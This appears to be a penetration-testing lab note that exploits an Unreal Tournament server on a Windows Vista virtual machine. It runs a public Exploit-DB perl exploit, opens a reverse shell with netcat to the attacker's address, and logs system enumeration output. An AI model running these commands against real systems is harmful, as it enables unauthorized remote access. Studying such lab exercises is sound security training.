# 4 :7778 unreal tournament

```
# We know its unreal tournament server from IRC topic
# As our target is windows

Using https://www.exploit-db.com/exploits/16145
$ perl 16145.pl 192.168.200.44 7778 192.168.49.200 6969

$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.44] 52551
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\UnrealTournament\System>whoami
fluffy-pc\daisy

C:\UnrealTournament\System>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\UnrealTournament\System>systeminfo
systeminfo

Host Name:                 FLUFFY-PC
OS Name:                   Microsoftr Windows VistaT Business
OS Version:                6.0.6002 Service Pack 2 Build 6002
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          fluffy
Registered Organization:
Product ID:                89584-OEM-7332141-00029
Original Install Date:     10/1/2015, 5:09:16 AM
System Boot Time:          8/18/2021, 9:36:51 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,023 MB
Available Physical Memory: 583 MB
Page File: Max Size:       2,309 MB
Page File: Available:      1,056 MB
Page File: In Use:         1,253 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\FLUFFY-PC
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB2305420
                           [02]: KB2999226
                           [03]: KB935509
                           [04]: KB937287
                           [05]: KB938371
                           [06]: KB955430
                           [07]: KB968930
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.200.44
```
